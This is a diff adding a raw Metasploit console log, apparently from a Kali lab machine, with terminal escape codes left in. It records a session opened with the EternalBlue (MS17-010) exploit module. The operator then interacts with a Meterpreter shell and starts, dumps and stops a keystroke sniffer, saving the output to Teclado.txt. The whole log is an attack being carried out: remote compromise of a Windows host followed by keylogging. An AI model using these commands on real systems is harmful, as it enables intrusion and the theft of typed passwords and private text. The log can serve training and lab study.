@@ -1,0 +1,18 @@
+[1m[34m[*][0m Spooling to file /home/kali/Teclado.txt...
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions 1[K-1 l[K[K[Ki 2[K1
+[0m[1m[31m[-][0m Invalid session identifier: 1
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> sessions -i 1[K3
+[0m[1m[34m[*][0m Starting interaction with 3...
+
+[4mmeterpreter[0m > backgroundkeyscan_stopdump -o /home/kali/Descargas/Teclado.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstart[K[Pmigrate 2044[P[P[P[P[P[P[P[Pexit[Ppwdcat /home/kali/Downloads/escargas/[K/Teclado.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pkeyscan_stopdump -o /home/kali/Descargas/Teclado.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstart[K[Popdump -o /home/kali/Teclado.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstart[Kdump -o /home/kali/Teclado.txt[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K
+[0mDumping captured keystrokes...
+[1m[31m[-][0m stdapi_ui_get_keys_utf8: Operation failed: Incorrect function.
+[4mmeterpreter[0m > keyscan_dump[P[Pbackgroundkeyscan_stopdump -o /home/kali/Descargas/Teclado.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstart[K
+[0mStarting the keystroke sniffer ...
+[4mmeterpreter[0m > keyscan_start[Pdump
+[0mDumping captured keystrokes...
+
+
+[4mmeterpreter[0m > keyscan_dumpstart[Pdump[P[Pbackgroundkeyscan_stopdump -o /home/kali/Descargas/Teclado.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cstop[K
+[0mStopping the keystroke sniffer...
+[4mmeterpreter[0m > 
